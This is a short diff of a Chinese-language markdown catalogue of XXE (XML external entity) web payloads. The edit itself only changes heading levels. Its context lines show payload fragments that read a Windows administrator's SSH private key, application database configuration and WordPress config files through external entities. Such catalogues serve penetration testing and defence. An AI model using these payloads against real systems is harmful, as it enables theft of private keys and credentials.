@@ -2,7 +2,7 @@
 
 _9 条 web payload_
 
-### XXE基础攻击  `xxe-basic`
+## XXE基础攻击  `xxe-basic`
 _XML外部实体注入基础攻击技术_
 子类：**基础攻击** · tags: `xxe` `xml` `external` `entity`
 
@@ -493,7 +493,7 @@ file:///c:/users/administrator/.ssh/id_rsa
 ]>
 <foo>&xxe;</foo>
 
-# 其他敏感文件
+## 其他敏感文件
 file:///c:/windows/syste` — XML内容 _value_
 
 **3. 读取Web配置**
@@ -518,7 +518,7 @@ file:///app/config/database.yml
 ]>
 <foo>&xxe;</foo>
 
-# 常见配置文件
+## 常见配置文件
 file:///var/www/html/wp-` — XML内容 _value_
 
 **4. 读取源代码**
